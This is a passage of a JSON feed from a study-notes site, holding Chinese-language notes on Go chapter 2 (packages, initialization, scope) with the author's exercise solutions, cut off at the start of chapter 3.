Decode函数是不同的。要在外部引用该函数，必须显式使用image.Decode或utf16.Decode形式访问。</p>\n<p>包还可以让我们通过控制哪些名字是外部可见的来隐藏内部实现信息。在Go语言中，一个简单的规则是：如果一个名字是大写字母开头的，那么该名字是导出的（译注：因为汉字不区分大小写，因此汉字开头的名字是没有导出的）。</p>\n<p>包代码存储在两个源文件中，用来演示如何在一个源文件声明然后在其他的源文件访问：</p>\n<p>我们把变量的声明、对应的常量，还有方法都放到tempconv.go源文件中：</p>\n<p><em>gopl.io/ch2/tempconv</em></p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Package tempconv performs Celsius and Fahrenheit conversions.\npackage tempconv\n\nimport \"fmt\"\n\ntype Celsius float64\ntype Fahrenheit float64\n\nconst (\n    AbsoluteZeroC Celsius = -273.15\n    FreezingC     Celsius = 0\n    BoilingC      Celsius = 100\n)\n\nfunc (c Celsius) String() string    { return fmt.Sprintf(\"%g°C\", c) }\nfunc (f Fahrenheit) String() string { return fmt.Sprintf(\"%g°F\", f) }\n</code></pre></div><p>转换函数则放在另一个conv.go源文件中：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package tempconv\n\n// CToF converts a Celsius temperature to Fahrenheit.\nfunc CToF(c Celsius) Fahrenheit { return Fahrenheit(c*9/5 + 32) }\n\n// FToC converts a Fahrenheit temperature to Celsius.\nfunc FToC(f Fahrenheit) Celsius { return Celsius((f - 32) * 5 / 9) }\n</code></pre></div><p>每个源文件都是以包的声明语句开始，用来指明包的名字。当包被导入的时候，包内的成员将通过类似tempconv.CToF的形式访问。而包级别的名字，例如在一个文件声明的类型和常量，在同一个包的其他源文件也是可以直接访问的，就好像所有代码都在一个文件一样。要注意的是tempconv.go源文件导入了fmt包，但是conv.go源文件并没有，因为这个源文件中的代码并没有用到fmt包。</p>\n<p>因为包级别的常量名都是以大写字母开头，它们可以像tempconv.AbsoluteZeroC这样被外部代码访问：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Printf(\"Brrrr! %v\\n\", tempconv.AbsoluteZeroC) // \"Brrrr! -273.15°C\"\n</code></pre></div><p>要将摄氏温度转换为华氏温度，需要先用import语句导入gopl.io/ch2/tempconv包，然后就可以使用下面的代码进行转换了：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(tempconv.CToF(tempconv.BoilingC)) // \"212°F\"\n</code></pre></div><p>在每个源文件的包声明前的注释是包注释（§10.7.4）。通常，包注释的第一句应该先是包的功能概要说明。一个包通常只有一个源文件有包注释（译注：如果有多个包注释，目前的文档工具会根据源文件名的先后顺序将它们链接为一个包注释）。如果包注释很大，通常会放到一个独立的doc.go文件中。</p>\n<h3>练习 2.1</h3>\n<p>向tempconv包添加类型、常量和函数用来处理Kelvin绝对温度的转换，Kelvin 绝对零度是−273.15°C，Kelvin绝对温度1K和摄氏度1°C的单位间隔是一样的。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Package tempconv performs Celsius and Fahrenheit conversions.</span>\n<span class=\"token keyword\">package</span> tempconv\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token keyword\">type</span> Celsius <span class=\"token builtin\">float64</span>\n<span class=\"token keyword\">type</span> Fahrenheit <span class=\"token builtin\">float64</span>\n<span class=\"token keyword\">type</span> Kelvin <span class=\"token builtin\">float64</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\tAbsoluteZeroC Celsius <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">273.15</span>\n\tFreezingC     Celsius <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\tBoilingC      Celsius <span class=\"token operator\">=</span> <span class=\"token number\">100</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c Celsius<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span>    <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%g°C\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>f Fahrenheit<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%g°F\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>k Kelvin<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span>     <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%gK\"</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n</code></pre></div><p>conv.go</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package tempconv\n\n// CToF converts a Celsius temperature to Fahrenheit.\nfunc CToF(c Celsius) Fahrenheit { return Fahrenheit(c*9/5 + 32) }\n\n// FToC converts a Fahrenheit temperature to Celsius.\nfunc FToC(f Fahrenheit) Celsius { return Celsius((f - 32) * 5 / 9) }\n\nfunc KToC(k Kelvin) Celsius { return Celsius(k - 273.15) }\n\n</code></pre></div><figure><figcaption>image-20240324214859220</figcaption></figure>\n<h3>2.6.1. 导入包</h3>\n<p>在Go语言程序中，每个包都有一个全局唯一的导入路径。导入语句中类似\"gopl.io/ch2/tempconv\"的字符串对应包的导入路径。Go语言的规范并没有定义这些字符串的具体含义或包来自哪里，它们是由构建工具来解释的。当使用Go语言自带的go工具箱时（第十章），一个导入路径代表一个目录中的一个或多个Go源文件。</p>\n<p>除了包的导入路径，每个包还有一个包名，包名一般是短小的名字（并不要求包名是唯一的），包名在包的声明处指定。按照惯例，一个包的名字和包的导入路径的最后一个字段相同，例如\tch2/pkg/tempconv包的名字一般是tempconv。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Cf converts its numeric argument to Celsius and Fahrenheit.\npackage main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"strconv\"\n\n    \"ch2/pkg/tempconv\"\n)\n\nfunc main() {\n    for _, arg := range os.Args[1:] {\n        t, err := strconv.ParseFloat(arg, 64)\n        if err != nil {\n            fmt.Fprintf(os.Stderr, \"cf: %v\\n\", err)\n            os.Exit(1)\n        }\n        f := tempconv.Fahrenheit(t)\n        c := tempconv.Celsius(t)\n        fmt.Printf(\"%s = %s, %s = %s\\n\",\n            f, tempconv.FToC(f), c, tempconv.CToF(c))\n    }\n}\n\n</code></pre></div><figure><figcaption>image-20240324221637025</figcaption></figure>\n<p>导入语句将导入的包绑定到一个短小的名字，然后通过该短小的名字就可以引用包中导出的全部内容。上面的导入声明将允许我们以tempconv.CToF的形式来访问ch2/pkg/tempconv包中的内容。</p>\n<p>如果导入了一个包，但是又没有使用该包将被当作一个编译错误处理。我们可以使用golang.org/x/tools/cmd/goimports导入工具，它可以根据需要自动添加或删除导入的包；许多编辑器都可以集成goimports工具，然后在保存文件的时候自动运行。类似的还有gofmt工具，可以用来格式化Go源文件。</p>\n<h3>练习 2.2</h3>\n<p>写一个通用的单位转换程序，用类似cf程序的方式从命令行读取参数，如果缺省的话则是从标准输入读取参数，然后做类似Celsius和Fahrenheit的单位转换，长度单位可以对应英尺和米，重量单位可以对应磅和公斤等。</p>\n<div class=\"language-GO\" data-ext=\"GO\" data-title=\"GO\"><pre class=\"language-GO\"><code>package unitconv\n\nimport \"fmt\"\n\ntype Feet float64\ntype Metre float64\n\ntype Celsius float64\ntype Fahrenheit float64\ntype Kelvin float64\n\ntype Pound float64\ntype Kilogram float64\n\n// 许多类型都会定义一个String方法，因为当使用fmt包的打印方法时，将会优先使用该类型对应的String方法返回的结果打印，我们将在7.1节讲述。\nfunc (f Feet) String() string  { return fmt.Sprintf(\"%g英尺\", f) }\nfunc (m Metre) String() string { return fmt.Sprintf(\"%g米\", m) }\n\nfunc (c Celsius) String() string    { return fmt.Sprintf(\"%g°C\", c) }\nfunc (f Fahrenheit) String() string { return fmt.Sprintf(\"%g°F\", f) }\nfunc (k Kelvin) String() string     { return fmt.Sprintf(\"%gK\", k) }\n\nfunc (p Pound) String() string    { return fmt.Sprintf(\"%g磅\", p) }\nfunc (k Kilogram) String() string { return fmt.Sprintf(\"%g公斤\", k) }\n\n\n</code></pre></div><p>conv.go</p>\n<div class=\"language-GO\" data-ext=\"GO\" data-title=\"GO\"><pre class=\"language-GO\"><code>package unitconv\n\n// Feet to Metre\n// Metre to Feet\n\n// CToF converts a Celsius temperature to Fahrenheit.\nfunc CToF(c Celsius) Fahrenheit { return Fahrenheit(c*9/5 + 32) }\n\n// FToC converts a Fahrenheit temperature to Celsius.\nfunc FToC(f Fahrenheit) Celsius { return Celsius((f - 32) * 5 / 9) }\n\nfunc KToC(k Kelvin) Celsius { return Celsius(k - 273.15) }\nfunc CToK(c Celsius) Kelvin { return Kelvin(c + 273.15) }\nfunc FToM(f Feet) Metre     { return Metre(f * 0.3048) }\n\nfunc MToF(m Metre) Feet { return Feet(m * 3.28084) }\n\nfunc PToK(p Pound) Kilogram { return Kilogram(p * 0.453592) }\n\nfunc KToP(k Kilogram) Pound { return Pound(k * 2.20462) }\n\n</code></pre></div><p>main.go</p>\n<div class=\"language-GO\" data-ext=\"GO\" data-title=\"GO\"><pre class=\"language-GO\"><code>// Cf converts its numeric argument to Celsius and Fahrenheit.\npackage main\n\nimport (\n\t\"ch2/pkg/unitconv\"\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tfor _, arg := range os.Args[1:] {\n\t\tt, err := strconv.ParseFloat(arg, 64)\n\t\tif err != nil {\n\t\t\tfmt.Fprintf(os.Stderr, \"cf: %v\\n\", err)\n\t\t\tos.Exit(1)\n\t\t}\n        // 练习2.2\n\t\tf := unitconv.Fahrenheit(t)\n\t\tc := unitconv.Celsius(t)\n\t\tfmt.Printf(\"%s = %s, %s = %s\\n\", f, tempconv.FToC(f), c, tempconv.CToF(c))\n\t\tfe := unitconv.Feet(t)\n\t\tm := unitconv.Metre(t)\n\t\tfmt.Printf(\"%s = %s, %s = %s\\n\", fe, unitconv.FToM(fe), m, unitconv.MToF(m))\n\t\tp := unitconv.Pound(t)\n\t\tk := unitconv.Kilogram(t)\n\t\tfmt.Printf(\"%s = %s, %s = %s\\n\", p, unitconv.PToK(p), k, unitconv.KToP(k))\n\t}\n}\n\n</code></pre></div><figure><figcaption>image-20240325113004910</figcaption></figure>\n<h3>2.6.2. 包的初始化</h3>\n<p>包的初始化首先是解决包级变量的依赖顺序，然后按照包级变量声明出现的顺序依次初始化：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var a = b + c // a 第三个初始化, 为 3\nvar b = f()   // b 第二个初始化, 为 2, 通过调用 f (依赖c)\nvar c = 1     // c 第一个初始化, 为 1\n\nfunc f() int { return c + 1 }\n</code></pre></div><p>如果包中含有多个.go源文件，它们将按照发给编译器的顺序进行初始化，Go语言的构建工具首先会将.go文件根据文件名排序，然后依次调用编译器编译。</p>\n<p>对于在包级别声明的变量，如果有初始化表达式则用表达式初始化，还有一些没有初始化表达式的，例如某些表格数据初始化并不是一个简单的赋值过程。在这种情况下，我们可以用一个特殊的init初始化函数来简化初始化工作。每个文件都可以包含多个init初始化函数</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func init() { /* ... */ }\n</code></pre></div><p>这样的init初始化函数除了不能被调用或引用外，其他行为和普通函数类似。在每个文件中的init初始化函数，在程序开始执行时按照它们声明的顺序被自动调用。</p>\n<p>每个包在解决依赖的前提下，以导入声明的顺序初始化，每个包只会被初始化一次。因此，如果一个p包导入了q包，那么在p包初始化的时候可以认为q包必然已经初始化过了。初始化工作是自下而上进行的，main包最后被初始化。以这种方式，可以确保在main函数执行之前，所有依赖的包都已经完成初始化工作了。</p>\n<p>下面的代码定义了一个PopCount函数，用于返回一个数字中含二进制1bit的个数。它使用init初始化函数来生成辅助表格pc，pc表格用于处理每个8bit宽度的数字含二进制的1bit的bit个数，这样的话在处理64bit宽度的数字时就没有必要循环64次，只需要8次查表就可以了。（这并不是最快的统计1bit数目的算法，但是它可以方便演示init函数的用法，并且演示了如何预生成辅助表格，这是编程中常用的技术）。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package popcount\n\n// pc[i] is the population count of i.\nvar pc [256]byte\n\nfunc init() {\n    for i := range pc {\n        pc[i] = pc[i/2] + byte(i&amp;1)\n    }\n}\n\n// PopCount returns the population count (number of set bits) of x.\nfunc PopCount(x uint64) int {\n    return int(pc[byte(x&gt;&gt;(0*8))] +\n        pc[byte(x&gt;&gt;(1*8))] +\n        pc[byte(x&gt;&gt;(2*8))] +\n        pc[byte(x&gt;&gt;(3*8))] +\n        pc[byte(x&gt;&gt;(4*8))] +\n        pc[byte(x&gt;&gt;(5*8))] +\n        pc[byte(x&gt;&gt;(6*8))] +\n        pc[byte(x&gt;&gt;(7*8))])\n}\n</code></pre></div><p>译注：对于pc这类需要复杂处理的初始化，可以通过将初始化逻辑包装为一个匿名函数处理，像下面这样：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// pc[i] is the population count of i.\nvar pc [256]byte = func() (pc [256]byte) {\n    for i := range pc {\n        pc[i] = pc[i/2] + byte(i&amp;1)\n    }\n    return\n}()\n</code></pre></div><p>要注意的是在init函数中，range循环只使用了索引，省略了没有用到的值部分。循环也可以这样写：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>for i, _ := range pc {\n</code></pre></div><h3>练习 2.3</h3>\n<p>重写PopCount函数，用一个循环代替单一的表达式。比较两个版本的性能。（11.4节将展示如何系统地比较两个不同实现的性能。）</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// LPopCount 把上面那个函数用for循环改一下\nfunc LPopCount(x uint64) int {\n\tstart := time.Now().UnixNano()\n\tcount := 0\n\tfor i := 0; i &lt; 8; i++ {\n\t\tcount += int(pc[byte(x&gt;&gt;(i*8))])\n\t}\n\tend := time.Now().UnixNano()\n\tfmt.Printf(\"LPopCount cost %v\\n\", end-start)\n\treturn count\n}\n</code></pre></div><h3>练习 2.4</h3>\n<p>用移位算法重写PopCount函数，每次测试最右边的1bit，然后统计总数。比较和查表算法的性能差异。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// SPopCount 移1位然后&amp;00000000....1，得1就说明最后一位是1\nfunc SPopCount(x uint64) int {\n\tstart := time.Now()\n\tcount := 0\n\n\tfor i := x; i &gt; 0; i = i &gt;&gt; 1 {\n\t\tcount += int(i &amp; 1)\n\t}\n\n\tfmt.Printf(\"SPopCount cost %v\\n\", time.Since(start))\n\treturn count\n}\n</code></pre></div><h3>练习 2.5</h3>\n<p>表达式 <code>x&amp;(x-1)</code>用于将x的最低的一个非零的bit位清零。使用这个算法重写PopCount函数，然后比较性能。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// CPopCount x&amp;(x-1)将x的最低的一个非零的bit位清零，这样能跳过0的匹配，速度应该快，但是没看出来\nfunc CPopCount(x uint64) int {\n\tstart := time.Now()\n\tcount := 0\n\tfor i := x; i &gt; 0; i = i &amp; (i - 1) {\n\t\tcount++\n\t}\n\n\tfmt.Printf(\"CPopCount cost %v\\n\", time.Since(start).Milliseconds())\n\treturn count\n}\n</code></pre></div><h2>2.7. 作用域</h2>\n<p><strong>声明语句的作用域是指源代码中可以有效使用这个名字的范围。</strong></p>\n<p>不要将作用域和生命周期混为一谈：</p>\n<ul>\n<li>声明语句的作用域对应的是一个源代码的文本区域；它是一个编译时的属性。</li>\n<li>一个变量的生命周期是指程序运行时变量存在的有效时间段，在此时间区域内它可以被程序的其他部分引用；是一个运行时的概念。</li>\n</ul>\n<p>**句法块：**是由花括弧所包含的一系列语句，就像函数体或循环体花括弧包裹的内容一样。句法块内部声明的名字是无法被外部块访问的。这个块决定了内部声明的名字的作用域范围。</p>\n<p>**词法块：**这些声明在代码中并未显式地使用花括号包裹起来，我们称之为词法块。对全局的源代码来说，存在一个整体的词法块，称为全局词法块；对于每个包，每个for、if和switch语句，也都有对应词法块；每个switch或select的分支也有独立的词法块；当然也包括显式书写的词法块（花括弧包含的语句）。</p>\n<p><strong>声明语句对应的词法域决定了作用域范围的大小。</strong></p>\n<ul>\n<li>对于内置的类型、函数和常量，比如int、len和true等是在全局作用域的，因此可以在整个程序中直接使用。任何在函数外部（也就是包级语法域）声明的名字可以在同一个包的任何源文件中访问的。</li>\n<li>对于导入的包，例如tempconv导入的fmt包，则是对应源文件级的作用域，因此只能在当前的文件中访问导入的fmt包，<strong>当前包的其它源文件无法访问在当前源文件导入的包。</strong></li>\n<li>许多声明语句，比如tempconv.CToF函数中的变量c，则是局部作用域的，它只能在函数内部（甚至只能是局部的某些部分）访问。</li>\n<li>控制流标号，就是break、continue或goto语句后面跟着的那种标号，则是函数级的作用域。</li>\n</ul>\n<blockquote>\n<p>一个程序可能包含多个同名的声明，只要它们在不同的词法域就没有关系。</p>\n</blockquote>\n<p>你可以声明一个局部变量，和包级的变量同名。或者是像2.3.3节的例子那样，你可以将一个函数参数的名字声明为new，虽然内置的new是全局作用域的。</p>\n<p>当编译器遇到一个名字引用时，它会对其定义进行查找，查找过程从最内层的词法域向全局的作用域进行。</p>\n<ul>\n<li>如果查找失败，则报告“未声明的名字”这样的错误。</li>\n<li>如果该名字在内部和外部的块分别声明过，则内部块的声明首先被找到。在这种情况下，内部声明屏蔽了外部同名的声明，让外部的声明的名字无法被访问</li>\n</ul>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">var</span> g <span class=\"token operator\">=</span> <span class=\"token string\">\"g\"</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tf <span class=\"token operator\">:=</span> <span class=\"token string\">\"f\"</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"f\"; 函数内部的var f覆盖了包级别的func f</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"g\"; 包级别的var g</span>\n\t<span class=\"token comment\">//fmt.Println(h) \t// # command-line-arguments  .\\test1.go:13:14: undefined: h</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>词法域</h3>\n<p>在函数中词法域可以深度嵌套，因此内部的一个声明可能屏蔽外部的声明。还有许多语法块是if或for等控制流语句构造的。下面的代码有三个不同的变量x，因为它们是定义在不同的词法域（这个例子只是为了演示作用域规则，但不是好的编程风格）。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func main() {\n\tx := \"hello!\"\n\tfor i := 0; i &lt; len(x); i++ {\n\t\tx := x[i]\n\t\tif x != '!' {\n\t\t\tx := x + 'A' - 'a'\n\t\t\tfmt.Printf(\"%c\", x) // \"HELLO\" (one letter per iteration)\n\t\t}\n\t}\n}\n</code></pre></div><p>上面的for语句创建了两个词法域：花括弧包含的是显式的部分，是for的循环体部分词法域，另外一个隐式的部分则是循环的初始化部分，比如用于迭代变量i的初始化。隐式的词法域部分的作用域还包含条件测试部分和循环后的迭代部分（<code>i++</code>），当然也包含循环体词法域。</p>\n<blockquote>\n<p>可以点一下变量  同样出现阴影的就是同一个x，vscode和goland都可以</p>\n<p>虽然但是，其实靠感觉是能知道作用域的</p>\n</blockquote>\n<h3>for循环词法域</h3>\n<p>下面的例子同样有三个不同的x变量，每个声明在不同的词法域，一个在函数体词法域，一个在for隐式的初始化词法域，一个在for循环体词法域；只有两个块是显式创建的：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func main() {\n    x := \"hello\"\n    for _, x := range x {\n        x := x + 'A' - 'a'\n        fmt.Printf(\"%c\", x) // \"HELLO\" (one letter per iteration)\n    }\n}\n</code></pre></div><h3>if和switch词法域</h3>\n<p>和for循环类似，if和switch语句也会在条件部分创建隐式词法域，还有它们对应的执行体词法域。下面的if-else测试链演示了x和y的有效作用域范围：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">if</span> x <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> x <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> y <span class=\"token operator\">:=</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> x <span class=\"token operator\">==</span> y <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// compile error: x and y are not visible here</span>\n\n</code></pre></div><p>第二个if语句嵌套在第一个内部，因此第一个if语句条件初始化词法域声明的变量在第二个if中也可以访问。switch语句的每个分支也有类似的词法域规则：条件部分为一个隐式词法域，然后是每个分支的词法域。</p>\n<h3>声明顺序</h3>\n<p>在包级别，声明的顺序并不会影响作用域范围，因此一个先声明的可以引用它自身或者是引用后面的一个声明，这可以让我们定义一些相互嵌套或递归的类型或函数。但是如果一个变量或常量递归引用了自身，则会产生编译错误。</p>\n<p>在这个程序中：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>if f, err := os.Open(fname); err != nil { // compile error: unused: f\n    return err\n}\nf.ReadByte() // compile error: undefined f\nf.Close()    // compile error: undefined f\n</code></pre></div><p>变量f的作用域只在if语句内，因此后面的语句将无法引入它，这将导致编译错误。你可能会收到一个局部变量f没有声明的错误提示，具体错误信息依赖编译器的实现。</p>\n<blockquote>\n<p>通常需要在if之前声明变量，这样可以确保后面的语句依然可以访问变量：</p>\n</blockquote>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f, err := os.Open(fname)\nif err != nil {\n    return err\n}\nf.ReadByte()\nf.Close()\n</code></pre></div><p>你可能会考虑通过将ReadByte和Close移动到if的else块来解决这个问题：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>if f, err := os.Open(fname); err != nil {\n    return err\n} else {\n    // f and err are visible here too\n    f.ReadByte()\n    f.Close()\n}\n</code></pre></div><p>但这不是Go语言推荐的做法，Go语言的习惯是在if中处理错误然后直接返回，这样可以确保正常执行的语句不需要代码缩进。</p>\n<h3>短变量声明语句的作用域</h3>\n<p>下面的程序，它的目的是获取当前的工作目录然后保存到一个包级的变量中。这本来可以通过直接调用os.Getwd完成，但是将这个从主逻辑中分离出来可能会更好，特别是在需要处理错误的时候。函数log.Fatalf用于打印日志信息，然后调用os.Exit(1)终止程序。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var cwd string\n\nfunc init() {\n    cwd, err := os.Getwd() // compile error: unused: cwd\n    if err != nil {\n        log.Fatalf(\"os.Getwd failed: %v\", err)\n    }\n}\n</code></pre></div><figure><figcaption>image-20240328161105801</figcaption></figure>\n<p>虽然cwd在外部已经声明过，但是 <code>:=</code>语句还是将cwd和err重新声明为新的局部变量。因为内部声明的cwd将屏蔽外部的声明，因此上面的代码并不会正确更新包级声明的cwd变量。</p>\n<p>由于当前的编译器会检测到局部声明的cwd并没有使用，然后报告这可能是一个错误，但是这种检测并不可靠。因为一些小的代码变更，例如增加一个局部cwd的打印语句，就可能导致这种检测失效。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var cwd string\n\nfunc init() {\n    cwd, err := os.Getwd()\n    if err != nil {\n        log.Fatalf(\"os.Getwd failed: %v\", err)\n    }\n    log.Printf(\"Working directory = %s\", cwd)\n}\n</code></pre></div><figure><figcaption>image-20240328161418959</figcaption></figure>\n<p>全局的cwd变量依然是没有被正确初始化的，而且看似正常的日志输出更是让这个BUG更加隐晦。</p>\n<p>有许多方式可以避免出现类似潜在的问题。最直接的方法是通过单独声明err变量，来避免使用 <code>:=</code>的简短声明方式：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var cwd string\n\nfunc init() {\n\tvar err error\n\tcwd, err = os.Getwd()\n\tif err != nil {\n\t\tlog.Fatalf(\"os.Getwd failed: %v\", err)\n\t}\n}\nfunc main() {\n\tlog.Printf(\"Working directory = %s\", cwd)\n}\n\n</code></pre></div><figure><figcaption>image-20240328161707443</figcaption></figure>\n<p>#TODO: c:\\为啥要小写</p>\n<blockquote>\n<p>使用Example_xxx的形式进行测试的时候发现，路径中的c:\\必须小写才能验证通过，但是写进一个正常的函数里，输出就是大写的C</p>\n</blockquote>\n<figure><figcaption>1712474443260</figcaption></figure>\n<p>下图为使用fmt.Printf和log.Printf的输出</p>\n<figure><figcaption>1712474628866</figcaption></figure>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "03. 基础数据类型",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch3.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch3.html",
      "summary": "03. 基础数据类型\nGo语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型。\n\n本章介绍基础类型，包括：数字、字符串和布尔型。\n复合数据类型——数组（§4.1）和结构体（§4.2）——是通过组合简单类型，来表达更加复杂的数据结构。\n引用类型包括指针（§2.3.2）、切片（§4.2)）、字典（§4.3）、函数（§5）、通道（§8）\n将在第7...",
      "content_html": "\n<p>Go语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型。</p>\n<ul>\n<li>本章介绍基础类型，包括：数字、字符串和布尔型。</li>\n<li>复合数据类型——数组（§4.1）和结构体（§4.2）——是通过组合简单类型，来表达更加复杂的数据结构。</li>\n<li>引用类型包括指针（§2.3.2）、切片（§4.2)）、字典（§4.3）、函数（§5）、通道（§8）</li>\n<li>将在第7章介绍接口类型</li>\n</ul>\n<p>虽然数据种类很多，但它们都是对程序中一个变量或状态的间接引用。这意味着对任一引用类型数据的修改都会影响所有该引用的拷贝。</p>\n<p>Go语言的数值类型包括几种不同大小的整数、浮点数和复数。每种数值类型都决定了对应的大小范围和是否支持正负符号。</p>\n<h2>3.1. 